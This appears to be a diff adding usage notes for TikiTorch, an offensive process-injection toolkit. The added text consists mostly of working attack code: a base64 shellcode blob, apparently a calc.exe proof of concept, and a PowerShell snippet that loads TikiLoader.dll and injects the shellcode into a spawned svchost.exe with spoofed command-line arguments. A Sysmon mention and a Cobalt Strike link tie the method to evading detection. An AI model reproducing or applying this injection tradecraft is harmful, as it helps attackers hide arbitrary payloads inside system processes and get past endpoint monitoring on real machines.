@@ -19,4 +19,23 @@ https://github.com/rasta-mouse/TikiTorch/pull/13
 
 See this for example.
 
+After experimentation, I settled on c# Optional Parameters to satsifty this requirement.
+
+```
+$shellcodeTxt = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"
+
+Add-Type -Path "C:\Users\mobile\Downloads\CarbonMonoxide\TikiTorch-master\TikiLoader\bin\Release\TikiLoader.dll"
+
+[TikiLoader.Injector]::QUAPCInject("C:\windows\system32\svchost.exe",[System.Convert]::Frombase64String($shellcodeTxt), $pid, "svchost.exe -k netsvcs BLAHDEBLAH")
+
+```
+
+
+
+Sysmon
+
+
+Just an example of how to use. You can choose whatever parameters you like for the starting process.
+
+xref: [How to Argue like Cobalt Strike](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)
 
